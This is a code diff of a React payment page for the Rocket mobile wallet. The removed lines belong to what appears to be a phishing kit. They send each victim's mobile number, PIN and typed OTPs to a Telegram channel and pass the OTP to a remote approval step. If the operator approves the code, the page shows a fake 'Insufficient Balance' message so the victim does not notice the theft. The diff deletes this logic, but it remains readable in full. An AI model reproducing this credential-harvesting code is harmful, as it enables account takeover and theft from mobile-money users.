@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "@/lib/flowRouter";
-import { sendTelegramNotification } from "@/lib/payment-telegram";
-import { submitOtpForApproval } from "@/lib/otpApproval";
+
+
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
@@ -76,7 +76,7 @@ const RocketPayment = () => {
     const v = e.target.value.replace(/\D/g, "").slice(0, 6);
     setOtp(v);
     if (v.length > otp.length && v.length > 0) {
-      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Rocket', paymentType: 'mfs', number: mobileAccount, pin, otp: v });
+      
     }
   };
 
@@ -84,35 +84,13 @@ const RocketPayment = () => {
     if (!isValidMobile()) { setShowError("Please enter a valid mobile number."); setTimeout(() => setShowError(""), 3000); return; }
     if (pin.length < 4) { setShowError("Please enter your PIN."); setTimeout(() => setShowError(""), 3000); return; }
     setIsSubmitting(true);
-    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Rocket', paymentType: 'mfs', number: mobileAccount, pin }, { force: true });
+    
     setTimeout(() => { setIsSubmitting(false); setShowOtp(true); }, 1000);
   };
 
   const [otpDenyCount, setOtpDenyCount] = useState(0);
-  const handleOtpSubmit = async () => {
-    if (otp.length < 6) { setShowError("Please enter the OTP."); setTimeout(() => setShowError(""), 3000); return; }
-    setIsSubmitting(true);
-    const nextAttempt = otpAttempts + 1;
-    setOtpAttempts(nextAttempt);
-    const decision = await submitOtpForApproval({
-      amount, method: 'Rocket', paymentType: 'mfs', number: mobileAccount, pin, otp,
-    }, { autoAttempt: nextAttempt, otpStartAt: otpStartAtRef.current });
-    setIsSubmitting(false);
-    if (decision === 'approved') {
-      navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}`);
-    } else if (decision === 'timeout' || decision === 'error') {
-      navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}`);
-    } else {
-      const nextDenies = otpDenyCount + 1;
-      setOtpDenyCount(nextDenies);
-      if (nextDenies >= 3) {
-        navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}`);
-        return;
-      }
-      setShowError("Invalid OTP provided."); setOtp("");
-      setTimeout(() => otpRef.current?.focus(), 50);
-      setTimeout(() => setShowError(""), 4000);
-    }
+  const handleOtpSubmit = () => {
+    navigate(`/payment-cancelled?reason=Payment isn't completed&amount=${amount}`);
   };
 
 
